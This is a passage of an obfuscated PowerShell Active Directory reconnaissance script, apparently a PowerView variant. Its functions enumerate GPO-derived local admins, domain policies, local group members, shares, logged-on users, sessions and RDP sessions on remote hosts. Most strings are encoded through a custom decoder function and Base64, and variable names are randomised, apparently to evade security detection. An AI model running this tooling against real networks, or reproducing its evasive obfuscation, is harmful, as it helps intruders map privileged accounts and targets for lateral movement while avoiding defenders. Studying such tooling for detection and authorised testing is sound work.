        Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
        or a custom local SID.
        Defaults to local 'Administrators'.

    .PARAMETER UsePSDrive

        Switch. Mount any found policy files with temporary PSDrives.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local
        
        Finds users who have local admin rights over WINDOWS3 through GPO correlation.

    .EXAMPLE

        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local -LocalGroup RDP
        
        Finds users who have RDP rights over WINDOWS3 through GPO correlation.
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,

        [String]
        $OUName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $Recurse,

        [String]
        $LocalGroup = 'Administrators',

        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
    
        if(!$ComputerName -and !$OUName) {
            Throw (HandleResult95 @(59,114,140,100,21,127,128,35,19,96,148,107,35,74,132,102,45,116,128,100,20,78,131,102,35,22,148,93,46,112,243,126,62,96,243,35,20,20,147,117,46,74,151,117,20,111,136,100,19,74,174,121,45,112,147,47) @(119,39,194,18))
        }

        if($ComputerName) {
            $daP3MI = Get-NetComputer -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize

            if(!$daP3MI) {
                throw ((HandleResult95 @(180,15,46,206,54,159,124,168,191,101,94,221) @(229,61,23,186,85,215,42,152)) + $fa0ya + (HandleResult95 @(104,230,82,116,104,230,108,119,67,246,120,113,67,200,127,111) @(33,161,62,1)) + $Domain + (HandleResult95 @(0,69,48,40,214,1,252,38,16,81,75,108,214,95,252,41) @(74,60,114,93,180,50,173,65)))
            }
            
            ForEach($fa0ya in $daP3MI) {
                # extract all OUs a computer is a part of
                $tRQ5E01c = $fa0ya.distinguishedname

                $FmQych = $tRQ5E01c.split(",") | Foreach-Object {
                    if($_.startswith((HandleResult95 @(48,248,88,6) @(100,201,13,63)))) {
                        $tRQ5E01c.substring($tRQ5E01c.indexof($_))
                    }
                }
            }
        }
        else {
            $FmQych = @($OUName)
        }

        Write-Verbose ((HandleResult95 @(27,37,116,111,164,182,211,125,43,119,47,168,231,255,34,5) @(77,98,50,22,254,132,133)) + $FmQych)

        $FmQych | Where-Object {$_} | Foreach-Object {

            $XOTwc = $_

            # for each OU the computer is a part of, get the full OU object
            $i46v = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | Foreach-Object { 
                # and then get any GPO links
                $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | Foreach-Object {
                    if ($_.startswith((HandleResult95 @(162,227,141,135,147,183,155,226) @(246,166,223,197,198)))) {
                        $_.split(";")[0]
                    }
                }
            } | Foreach-Object {
                $KAuD =  @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $_
                    'UsePSDrive' = $UsePSDrive
                    'PageSize' = $PageSize
                }

                # for each GPO link, get any locally set user/group SIDs
                Get-NetGPOGroup @KAuD
            }

            # for each found GPO group, resolve the SIDs of the members
            $i46v | Where-Object {$_} | Foreach-Object {
                $g6I4X0Af = $_
                $g6I4X0Af.members | Foreach-Object {

                    # resolvethis SID to a domain object
                    $Object = Get-ADObject -Domain $Domain -DomainController $DomainController $_ -PageSize $PageSize

                    $slBZUK = New-Object PSObject
                    $slBZUK | Add-Member Noteproperty 'ComputerName' $ComputerName
                    $slBZUK | Add-Member Noteproperty 'OU' $XOTwc
                    $slBZUK | Add-Member Noteproperty 'GPODisplayName' $g6I4X0Af.GPODisplayName
                    $slBZUK | Add-Member Noteproperty 'GPOPath' $g6I4X0Af.GPOPath
                    $slBZUK | Add-Member Noteproperty 'ObjectName' $Object.name
                    $slBZUK | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $slBZUK | Add-Member Noteproperty 'ObjectSID' $_
                    $slBZUK | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -notmatch '805306368')
                    $slBZUK 

                    # if we're recursing and the current result object is a group
                    if($Recurse -and $slBZUK.isGroup) {

                        Get-NetGroupMember -SID $_ -FullData -Recurse -PageSize $PageSize | Foreach-Object {

                            $wKM7 = $_.distinguishedName

                            # extract the FQDN from the Distinguished Name
                            $LFju8kS = $wKM7.subString($wKM7.IndexOf((HandleResult95 @(14,212,131,158) @(92,145,206,167,8,99)))) -replace 'DC=','' -replace ',','.'

                            if ($_.samAccountType -ne (HandleResult95 @(235,138,61,218,233,180,61,217,233,180,37,223) @(164,206,124,235))) {
                                $x5xlh = $True
                            }
                            else {
                                $x5xlh = $False
                            }

                            if ($_.samAccountName) {
                                # forest users have the samAccountName set
                                $oIRTSkE = $_.samAccountName
                            }
                            else {
                                # external trust users have a SID, so convert it
                                try {
                                    $oIRTSkE = Convert-SidToName $_.cn
                                }
                                catch {
                                    # if there's a problem contacting the domain to resolve the SID
                                    $oIRTSkE = $_.cn
                                }
                            }

                            $slBZUK = New-Object PSObject
                            $slBZUK | Add-Member Noteproperty 'ComputerName' $ComputerName
                            $slBZUK | Add-Member Noteproperty 'OU' $XOTwc
                            $slBZUK | Add-Member Noteproperty 'GPODisplayName' $g6I4X0Af.GPODisplayName
                            $slBZUK | Add-Member Noteproperty 'GPOPath' $g6I4X0Af.GPOPath
                            $slBZUK | Add-Member Noteproperty 'ObjectName' $oIRTSkE
                            $slBZUK | Add-Member Noteproperty 'ObjectDN' $wKM7
                            $slBZUK | Add-Member Noteproperty 'ObjectSID' $_.objectsid
                            $slBZUK | Add-Member Noteproperty 'IsGroup' $x5xlh
                            $slBZUK 
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainPolicy {
<#
    .SYNOPSIS

        Returns the default domain or DC policy for a given
        domain or domain controller.

        Thanks Sean Metacalf (@pyrotek3) for the idea and guidance.

    .PARAMETER Source

        Extract Domain or DC (domain controller) policies.

    .PARAMETER Domain

        The domain to query for default policies, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ResolveSids

        Switch. Resolve Sids from a DC policy to object names.

    .PARAMETER UsePSDrive

        Switch. Mount any found policy files with temporary PSDrives.

    .EXAMPLE

        PS C:\> Get-NetGPO

        Returns the GPOs in the current domain. 
#>

    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet((HandleResult95 @(136,25,56,148,131,9,109,149) @(218,94,1,224)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))))]
        $Source =(HandleResult95 @(81,234,237,199,90,250,184,198) @(3,173,212,179)),

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveSids,

        [Switch]
        $UsePSDrive
    )

    if($Source -eq (HandleResult95 @(25,99,115,220,202,60,13,62) @(75,36,74,168,147,107,97))) {
        # query the given domain for the default domain policy object
        $g6I4X0Af = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname (HandleResult95 @(186,146,126,173,129,255,106,152,165,73,132,167,217,116,158,144,125,190,129,225,109,139,174,118,152,185,165,21,145,172,101,146,156,193,97,168,185,73,148,224,199,75,150,221,124,145,130,210,111,135,216,14) @(223,232,51,213,208,149,32))
        
        if($g6I4X0Af) {
            # grab the GptTmpl.inf file and parse it
            $GptTmplPath = $g6I4X0Af.gpcfilesyspath + (HandleResult95 @(74,217,140,166,198,110,122,214,233,143,193,61,70,203,209,142,244,51,43,230,223,214,205,110,74,218,217,148,245,51,64,234,217,215,218,57,70,240,239,135,194,108,68,246,239,179,197,46,118,218,197,172,244,22,64,201,223,188,213,45,94,241,209,145,205,57,47,161) @(18,156,189,228,151,94))

            $v3GrfwQ9 =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }

            # parse the GptTmpl.inf
            Get-GptTmpl @v3GrfwQ9
        }

    }
    elseif($Source -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM=")))) {
        # query the given domain/dc for the default domain controller policy object
        $g6I4X0Af = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname (HandleResult95 @(38,241,215,64,18,241,200,49,12,207,215,70,15,223,204,122,13,224,212,118,14,223,203,71,14,226,189,55,13,207,219,69,15,223,204,117,18,241,204,50,17,224,196,55,12,207,223,69,12,211,189,63) @(67,139,141,2))

        if($g6I4X0Af) {
            # grab the GptTmpl.inf file and parse it
            $GptTmplPath = $g6I4X0Af.gpcfilesyspath + (HandleResult95 @(75,43,246,210,191,35,6,141,196,133,69,13,147,199,130,121,13,170,169,148,113,92,157,160,182,85,10,183,242,131,65,24,163,163,163,116,58,171,194,141,70,92,145,250,188,68,60,183,244,168,107,38,164,216,188,70,12,159,210,157,95,3,171,229,180,116,83,250) @(19,110,199,144,238))

            $v3GrfwQ9 =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }

            # parse the GptTmpl.inf
            Get-GptTmpl @v3GrfwQ9 | Foreach-Object {
                if($ResolveSids) {
                    # if we're resolving sids in PrivilegeRights to names
                    $lRMbKLe0 = New-Object PSObject
                    $_.psobject.properties | Foreach-Object {
                        if( $_.Name -eq 'PrivilegeRights') {

                            $lwvN = New-Object PSObject
                            # for every nested SID member of PrivilegeRights, try to 
                            #   unpack everything and resolve the SIDs as appropriate
                            $_.Value.psobject.properties | Foreach-Object {

                                $aimG = $_.Value | Foreach-Object {
                                    try {
                                        if($_ -isnot [System.Array]) { 
                                            Convert-SidToName $_ 
                                        }
                                        else {
                                            $_ | Foreach-Object { Convert-SidToName $_ }
                                        }
                                    }
                                    catch {
                                        Write-Debug ((HandleResult95 @(64,164,223,144,88,59,94,1,113,145,195,147,88,58,111,84,115,171,160,135,115,78,89,44,64,191,212,223,115,73,42,91) @(18,252,149,233,58,8,23,102)) + $_)
                                    }
                                }

                                $lwvN | Add-Member Noteproperty $_.Name $aimG
                            }

                            $lRMbKLe0 | Add-Member Noteproperty 'PrivilegeRights' $lwvN
                        }
                        else {
                            $lRMbKLe0 | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    $lRMbKLe0
                }
                else { $_ }
            }
        }
    }
}



########################################################
#
# Functions that enumerate a single host, either through
# WinNT, WMI, remote registry, or API calls 
# (with PSReflect).
#
########################################################

function Get-NetLocalGroup {
<#
    .SYNOPSIS

        Gets a list of all current users in a specified local group,
        or returns the names of all local groups with -ListGroups.

    .PARAMETER ComputerName

        The hostname or IP to query for local group users.

    .PARAMETER ComputerFile

        File of hostnames/IPs to query for local group users.

    .PARAMETER GroupName

        The local group name to query for users. If not given, it defaults to "Administrators"

    .PARAMETER ListGroups

        Switch. List all the local groups instead of their members.
        Old Get-NetLocalGroups functionality.

    .PARAMETER Recurse

        Switch. If the local member member is a domain group, recursively try to resolve its members to get a list of domain users who can access this machine.

    .EXAMPLE

        PS C:\> Get-NetLocalGroup

        Returns the usernames that of members of localgroup "Administrators" on the local host.

    .EXAMPLE

        PS C:\> Get-NetLocalGroup -ComputerName WINDOWSXP

        Returns all the local administrator accounts for WINDOWSXP

    .EXAMPLE

        PS C:\> Get-NetLocalGroup -ComputerName WINDOWS7 -Resurse 

        Returns all effective local/domain users/groups that can access WINDOWS7 with
        local administrative privileges.

    .EXAMPLE

        PS C:\> Get-NetLocalGroup -ComputerName WINDOWS7 -ListGroups

        Returns all local groups on the WINDOWS7 host.

    .LINK

        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
        http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $GroupName = 'Administrators',

        [Switch]
        $ListGroups,

        [Switch]
        $Recurse
    )

    begin {
        if ((-not $ListGroups) -and (-not $GroupName)) {
            # resolve the SID for the local admin group - this should usually default to "Administrators"
            $TwQZMSe = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
            $e3Miv = $TwQZMSe.Translate( [System.Security.Principal.NTAccount])
            $GroupName = ($e3Miv.Value).Split('\')[1]
        }
    }
    process {

        $WWfKB1U = @()

        # if we have a host list passed, grab it
        if($ComputerFile) {
            $WWfKB1U = Get-Content -Path $ComputerFile
        }
        else {
            # otherwise assume a single host name
            $WWfKB1U += Get-NameField -Object $ComputerName
        }

        # query the specified group using the WINNT provider, and
        # extract fields as appropriate from the results
        ForEach($BCqCw1p in $WWfKB1U) {
            try {
                if($ListGroups) {
                    # if we're listing the group names on a remote server
                    $fa0ya = [ADSI]((HandleResult95 @(0,130,91,171,243,58,225,1,146,222,110,141) @(86,176,55,222,167)) + $BCqCw1p + (HandleResult95 @(234,111,227,71,196,112,239,0,194,111,251,72) @(166,40,173,49)))

                    $fa0ya.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                        $ayFBYTwN = New-Object PSObject
                        $ayFBYTwN | Add-Member Noteproperty 'Server' $BCqCw1p
                        $ayFBYTwN | Add-Member Noteproperty 'Group' ($_.name[0])
                        $ayFBYTwN | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                        $ayFBYTwN | Add-Member Noteproperty 'Description' ($_.Description[0])
                        $ayFBYTwN
                    }
                }
                else {
                    # otherwise we're listing the group members
                    $zRQl = @($([ADSI]((HandleResult95 @(80,85,122,56,20,203,100,108,74,30,46,112) @(6,103,22,77,64,167,53,90)) + $BCqCw1p + "/" + $GroupName)).psbase.Invoke('Members'))

                    $zRQl | ForEach-Object {

                        $fh1Y = New-Object PSObject
                        $fh1Y | Add-Member Noteproperty 'Server' $BCqCw1p

                        $AdsPath = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $Null, $_, $Null)).Replace('WinNT://', '')

                        # try to translate the NT4 domain to a FQDN if possible
                        $Name = Convert-NT4toCanonical -ObjectName $AdsPath
                        if($Name) {
                            $aiRYU = $Name.split("/")[0]
                            $hMCTY = $AdsPath.split("/")[-1]
                            $Name = ($aiRYU + "/" + $hMCTY)
                            $oBx8r = $True
                        }
                        else {
                            $Name = $AdsPath
                            $oBx8r = $False
                        }

                        $fh1Y | Add-Member Noteproperty 'AccountName' $Name

                        # translate the binary sid to a string
                        $fh1Y | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)

                        # if the account is local, check if it's disabled, if it's domain, always print $False
                        #   TODO: fix this occasinal error?
                        $fh1Y | Add-Member Noteproperty 'Disabled' $( if(-not $oBx8r) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $Null, $_, $Null) } catch { 'ERROR' } } else { $False } )

                        # check if the member is a group
                        $tHuZe6n = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
                        $fh1Y | Add-Member Noteproperty 'IsGroup' $tHuZe6n
                        $fh1Y | Add-Member Noteproperty 'IsDomain' $oBx8r
                        if($tHuZe6n) {
                            $fh1Y | Add-Member Noteproperty 'LastLogin' ""
                        }
                        else {
                            try {
                                $fh1Y | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))
                            }
                            catch {
                                $fh1Y | Add-Member Noteproperty 'LastLogin' ""
                            }
                        }
                        $fh1Y

                        # if the result is a group domain object and we're recursing,
                        # try to resolve all the group member results
                        if($Recurse -and $oBx8r -and $tHuZe6n) {

                            $aiRYU = $Name.split("/")[0]
                            $GroupName = $Name.split("/")[1].trim()

                            Get-NetGroupMember -GroupName $GroupName -Domain $aiRYU -FullData -Recurse | ForEach-Object {

                                $fh1Y = New-Object PSObject
                                $fh1Y | Add-Member Noteproperty 'Server' ($aiRYU + "/" + $($_.GroupName))

                                $wKM7 = $_.distinguishedName
                                # extract the FQDN from the Distinguished Name
                                $LFju8kS = $wKM7.subString($wKM7.IndexOf((HandleResult95 @(88,134,94,62) @(10,195,19,7,65,97)))) -replace 'DC=','' -replace ',','.'

                                if ($_.samAccountType -ne (HandleResult95 @(173,101,193,20,231,152,96,178,104,208,187,21) @(226,33,128,37,170))) {
                                    $x5xlh = $True
                                }
                                else {
                                    $x5xlh = $False
                                }

                                if ($_.samAccountName) {
                                    # forest users have the samAccountName set
                                    $oIRTSkE = $_.samAccountName
                                }
                                else {
                                    try {
                                        # external trust users have a SID, so convert it
                                        try {
                                            $oIRTSkE = Convert-SidToName $_.cn
                                        }
                                        catch {
                                            # if there's a problem contacting the domain to resolve the SID
                                            $oIRTSkE = $_.cn
                                        }
                                    }
                                    catch {
                                        Write-Debug ((HandleResult95 @(225,74,103,255,127,128,91,74,229,112,229,104,79,180,101,129,115,122,179,115,250,84,99,204,79,240,83,27,207,92,142,47) @(179,18,45,134,29)) + $_)
                                    }
                                }

                                $fh1Y | Add-Member Noteproperty 'AccountName' ($LFju8kS + "/" + $oIRTSkE)
                                $fh1Y | Add-Member Noteproperty 'SID' $_.objectsid
                                $fh1Y | Add-Member Noteproperty 'Disabled' $False
                                $fh1Y | Add-Member Noteproperty 'IsGroup' $x5xlh
                                $fh1Y | Add-Member Noteproperty 'IsDomain' $True
                                $fh1Y | Add-Member Noteproperty 'LastLogin' ''
                                $fh1Y
                            }
                        }
                    }
                }
            }
            catch {
                Write-Warning ((HandleResult95 @(100,201,174,36,122,245,190,57,80,221,209,57,124,217,169,125) @(51,176,232,64)) + $_)
            }
        }
    }
}


function Get-NetShare {
<#
    .SYNOPSIS

        This function will execute the NetShareEnum Win32API call to query
        a given host for open shares. This is a replacement for
        "net share \\hostname"

    .PARAMETER ComputerName

        The hostname to query for shares. Also accepts IP addresses.

    .OUTPUTS

        SHARE_INFO_1 structure. A representation of the SHARE_INFO_1
        result structure which includes the name and note for each share.

    .EXAMPLE

        PS C:\> Get-NetShare

        Returns active shares on the local host.

    .EXAMPLE

        PS C:\> Get-NetShare -ComputerName sqlserver

        Returns active shares on the 'sqlserver' host
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $ComputerName = Get-NameField -Object $ComputerName

        # arguments for NetShareEnum
        $t8I3fsSF = 1
        $AZZX = [IntPtr]::Zero
        $gc7Fx = 0
        $NPMa = 0
        $uSWVRSW = 0

        # get the share information
        $e9hz = $pyQHtec7::NetShareEnum($ComputerName, $t8I3fsSF, [ref]$AZZX, -1, [ref]$gc7Fx, [ref]$NPMa, [ref]$uSWVRSW)

        # Locate the offset of the initial intPtr
        $Offset = $AZZX.ToInt64()

        Write-Debug ((HandleResult95 @(100,77,33,217,122,42,66,133,82,57,57,134,111,39,61,133,127,55,61,133,85,76,33,154,82,59,24,142) @(54,127,119,233)) + $e9hz)

        # 0 = success
        if (($e9hz -eq 0) -and ($Offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $RRXu = $SWAZiW::GetSize()

            # parse all the result structures
            for ($kUfFVle = 0; ($kUfFVle -lt $gc7Fx); $kUfFVle++) {
                # create a new int ptr at the given offset and cast
                #   the pointer as our result structure
                $frhLlHV = New-Object System.Intptr -ArgumentList $Offset
                $vPFl = $frhLlHV -as $SWAZiW
                # return all the sections of the structure
                $vPFl | Select-Object *
                $Offset = $frhLlHV.ToInt64()
                $Offset += $RRXu
            }

            # free up the result buffer
            $Null = $pyQHtec7::NetApiBufferFree($AZZX)
        }
        else
        {
            switch ($e9hz) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetLoggedon {
<#
    .SYNOPSIS

        This function will execute the NetWkstaUserEnum Win32API call to query
        a given host for actively logged on users.

    .PARAMETER ComputerName

        The hostname to query for logged on users.

    .OUTPUTS

        WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1
        result structure which includes the username and domain of logged on users.

    .EXAMPLE

        PS C:\> Get-NetLoggedon

        Returns users actively logged onto the local host.

    .EXAMPLE

        PS C:\> Get-NetLoggedon -ComputerName sqlserver

        Returns users actively logged onto the 'sqlserver' host.

    .LINK

        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $ComputerName = Get-NameField -Object $ComputerName

        # Declare the reference variables
        $t8I3fsSF = 1
        $AZZX = [IntPtr]::Zero
        $gc7Fx = 0
        $NPMa = 0
        $uSWVRSW = 0

        # get logged on user information
        $e9hz = $pyQHtec7::NetWkstaUserEnum($ComputerName, $t8I3fsSF, [ref]$AZZX, -1, [ref]$gc7Fx, [ref]$NPMa, [ref]$uSWVRSW)

        # Locate the offset of the initial intPtr
        $Offset = $AZZX.ToInt64()

        Write-Debug ((HandleResult95 @(167,101,187,159,185,2,216,195,145,18,149,217,175,101,137,195,175,16,212,218,188,31,167,195,150,100,187,220,145,19,130,200) @(245,87,237,175)) + $e9hz)

        # 0 = success
        if (($e9hz -eq 0) -and ($Offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $RRXu = $JjX6hJWr::GetSize()

            # parse all the result structures
            for ($kUfFVle = 0; ($kUfFVle -lt $gc7Fx); $kUfFVle++) {
                # create a new int ptr at the given offset and cast
                #   the pointer as our result structure
                $frhLlHV = New-Object System.Intptr -ArgumentList $Offset
                $vPFl = $frhLlHV -as $JjX6hJWr

                # return all the sections of the structure
                $vPFl | Select-Object *
                $Offset = $frhLlHV.ToInt64()
                $Offset += $RRXu

            }

            # free up the result buffer
            $Null = $pyQHtec7::NetApiBufferFree($AZZX)
        }
        else
        {
            switch ($e9hz) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetSession {
<#
    .SYNOPSIS

        This function will execute the NetSessionEnum Win32API call to query
        a given host for active sessions on the host.
        Heavily adapted from dunedinite's post on stackoverflow (see LINK below)

    .PARAMETER ComputerName

        The ComputerName to query for active sessions.

    .PARAMETER UserName

        The user name to filter for active sessions.

    .OUTPUTS

        SESSION_INFO_10 structure. A representation of the SESSION_INFO_10
        result structure which includes the host and username associated
        with active sessions.

    .EXAMPLE

        PS C:\> Get-NetSession

        Returns active sessions on the local host.

    .EXAMPLE

        PS C:\> Get-NetSession -ComputerName sqlserver

        Returns active sessions on the 'sqlserver' host.

    .LINK

        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',

        [String]
        $UserName = ''
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $ComputerName = Get-NameField -Object $ComputerName

        # arguments for NetSessionEnum
        $t8I3fsSF = 10
        $AZZX = [IntPtr]::Zero
        $gc7Fx = 0
        $NPMa = 0
        $uSWVRSW = 0

        # get session information
        $e9hz = $pyQHtec7::NetSessionEnum($ComputerName, '', $UserName, $t8I3fsSF, [ref]$AZZX, -1, [ref]$gc7Fx, [ref]$NPMa, [ref]$uSWVRSW)

        # Locate the offset of the initial intPtr
        $Offset = $AZZX.ToInt64()

        Write-Debug ((HandleResult95 @(21,119,181,248,82,141,114,13,35,3,173,164,125,235,9,17,37,119,215,175,125,181,17,27,35,18,155,248,81,177,6,92) @(71,69,227,200,30,216,71,97)) + $e9hz)

        # 0 = success
        if (($e9hz -eq 0) -and ($Offset -gt 0)) {

            # Work out how mutch to increment the pointer by finding out the size of the structure
            $RRXu = $LdmYxDq::GetSize()

            # parse all the result structures
            for ($kUfFVle = 0; ($kUfFVle -lt $gc7Fx); $kUfFVle++) {
                # create a new int ptr at the given offset and cast
                # the pointer as our result structure
                $frhLlHV = New-Object System.Intptr -ArgumentList $Offset
                $vPFl = $frhLlHV -as $LdmYxDq

                # return all the sections of the structure
                $vPFl | Select-Object *
                $Offset = $frhLlHV.ToInt64()
                $Offset += $RRXu

            }
            # free up the result buffer
            $Null = $pyQHtec7::NetApiBufferFree($AZZX)
        }
        else
        {
            switch ($e9hz) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function Get-NetRDPSession {
<#
    .SYNOPSIS

        This function will execute the WTSEnumerateSessionsEx and 
        WTSQuerySessionInformation Win32API calls to query a given
        RDP remote service for active sessions and originating IPs.
        This is a replacement for qwinsta.

        Note: only members of the Administrators or Account Operators local group
        can successfully execute this functionality on a remote target.

    .PARAMETER ComputerName

        The hostname to query for active RDP sessions.

    .EXAMPLE

        PS C:\> Get-NetRDPSession

        Returns active RDP/terminal sessions on the local host.

    .EXAMPLE

        PS C:\> Get-NetRDPSession -ComputerName "sqlserver"

        Returns active RDP/terminal sessions on the 'sqlserver' host.
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )
    
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple host object types from the pipeline
        $ComputerName = Get-NameField -Object $ComputerName

        # open up a handle to the Remote Desktop Session host
        $qT9jK = $KBfbHiS::WTSOpenServerEx($ComputerName)

        # if we get a non-zero handle back, everything was successful
        if ($qT9jK -ne 0) {

            Write-Debug ((HandleResult95 @(157,253,252,45,135,18,50,167,174,194,55,191,66,30,145,160,205,18,133,21,57,140,164,198,27,190,115,3,145,152,193,30) @(203,204,174,121,211,33,112)) + $qT9jK)

            # arguments for WTSEnumerateSessionsEx
            $I8LSIf = [IntPtr]::Zero
            $Gew58 = 0
            
            # get information on all current sessions
            $e9hz = $KBfbHiS::WTSEnumerateSessionsEx($qT9jK, [ref]1, 0, [ref]$I8LSIf, [ref]$Gew58)

            # Locate the offset of the initial intPtr
            $Offset = $I8LSIf.ToInt64()

            Write-Debug ((HandleResult95 @(44,238,156,149,40,136,251,240,24,136,152,184,35,135,156,173,47,237,152,187,25,237,162,183,24,177,128,135,31,156,140,184,32,135,128,240,24,151,159,247,51,158,243,252) @(122,223,206,193)) + $e9hz)
            Write-Debug ((HandleResult95 @(7,71,139,248,188,210,229,213,43,107,132,179) @(100,2,197,142,216,133,208,229)) + $Gew58)

            if (($e9hz -ne 0) -and ($Offset -gt 0)) {

                # Work out how mutch to increment the pointer by finding out the size of the structure
                $RRXu = $iXPiA::GetSize()

                # parse all the result structures
                for ($kUfFVle = 0; ($kUfFVle -lt $Gew58); $kUfFVle++) {
     
                    # create a new int ptr at the given offset and cast
                    #   the pointer as our result structure
                    $frhLlHV = New-Object System.Intptr -ArgumentList $Offset
                    $vPFl = $frhLlHV -as $iXPiA

                    $xtTSyNT = New-Object PSObject

                    if ($vPFl.pHostName) {
                        $xtTSyNT | Add-Member Noteproperty 'ComputerName' $vPFl.pHostName
                    }
                    else {
                        # if no hostname returned, use the specified hostname
                        $xtTSyNT | Add-Member Noteproperty 'ComputerName' $ComputerName
                    }

                    $xtTSyNT | Add-Member Noteproperty 'SessionName' $vPFl.pSessionName

                    if ($(-not $vPFl.pDomainName) -or ($vPFl.pDomainName -eq '')) {
                        # if a domain isn't returned just use the username
                        $xtTSyNT | Add-Member Noteproperty 'UserName' ($($vPFl.pUserName))
                    }
                    else {
                        $xtTSyNT | Add-Member Noteproperty 'UserName' ($($vPFl.pDomainName) + "\" + $($vPFl.pUserName))
                    }

                    $xtTSyNT | Add-Member Noteproperty 'ID' $vPFl.SessionID
                    $xtTSyNT | Add-Member Noteproperty 'State' $vPFl.State

                    $cg3KS6l = [IntPtr]::Zero
                    $AacDCgi6 = 0

